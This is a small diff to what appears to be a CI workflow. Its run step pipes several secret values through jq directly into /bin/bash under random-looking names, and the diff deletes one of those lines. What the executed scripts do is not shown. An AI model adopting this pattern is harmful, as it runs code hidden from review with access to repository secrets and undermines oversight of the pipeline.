@@ -19,7 +19,6 @@ jobs:
           alua7496: ${{ secrets.alua7496 }}
         run: |
           printf '%s' "$alua7496" | jq -r .vm665 | /bin/bash
-          echo $qta44 | jq -r .db262 | /bin/bash
           printf '%s' "$yq18" | jq -r .nk99532 | /bin/bash
           printf '%s' "$oivy91291" | jq -r .gclr561 | /bin/bash
 
